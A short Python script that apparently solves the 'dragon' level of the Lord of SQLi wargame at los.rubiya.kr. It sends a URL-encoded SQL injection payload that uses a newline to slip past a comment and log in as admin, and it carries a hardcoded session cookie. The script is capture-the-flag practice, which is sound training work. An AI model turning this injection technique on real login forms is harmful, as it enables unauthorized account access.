import requests

url = "https://los.rubiya.kr/chall/dragon_51996aa769df79afbf79eb4d66dbcef6.php?"
cookie = {'PHPSESSID':'41ch1dk7fgs5lsvh16aatjqosh'}

def solve():
    query = "pw=%0a%271%27%20or%20id=%27admin"
    res = requests.get(url=url+query, cookies=cookie)
    if "Hello admin" in res.text:
        print("DRAGON Clear!")

if __name__ == "__main__":
    solve()